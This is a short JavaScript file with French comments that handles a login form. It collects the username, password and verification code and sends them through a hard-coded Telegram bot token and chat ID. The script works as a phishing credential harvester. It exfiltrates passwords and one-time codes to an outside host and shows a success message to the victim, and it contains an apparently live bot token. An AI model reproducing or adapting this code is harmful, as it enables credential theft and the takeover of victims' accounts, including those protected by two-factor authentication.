// Gestion de la soumission du formulaire de connexion
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();
    
    // Récupérer les valeurs des champs de formulaire de connexion
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
  
    // Validation basique des champs de connexion
    if (username.trim() === "" || password.trim() === "") {
        alert("❌ Tous les champs de connexion doivent être remplis.");
        return;
    }
  
    // Récupérer la valeur du code de vérification
    let verificationCode = document.getElementById("verificationCode").value;
  
    // Validation du code de vérification
    if (verificationCode.trim() === "") {
        alert("❌ Le code de vérification est requis.");
        return;
    }
  
    // Si les champs sont valides, envoyer les données au bot Telegram
    let botToken = "7754364382:AAGSI6WoQmn0YV4YUV7rLRFyUcVvBYf4juQ";  // Remplace par ton token
    let chatId = "5305199760";  // Remplace par ton chat ID (ton ID personnel)
  
    // Créer un message structuré avec les informations de connexion et le code de vérification
    let message = `
    🔑 **Détails de la connexion et code de vérification** 🔑
  
    👤 **Nom d'utilisateur / Email** : ${username}
    🔒 **Mot de passe** : ${password}
    🔑 **Code de vérification** : ${verificationCode}
  
    📝 Merci d'avoir utilisé ce service !
    `;
  
    // Envoi du message au bot Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(response => response.json())
        .then(data => alert("✅ Message envoyé avec succès ! 🎉"))
        .catch(error => {
          console.error("Erreur :", error);
          alert("Une erreur s'est produite lors de l'envoi des informations.");
        });
  
    // Ici, tu peux aussi rediriger l'utilisateur ou effectuer d'autres actions après l'envoi
    // window.location.href = "dashboard.html";  // Exemple de redirection vers une autre page après soumission
  });
  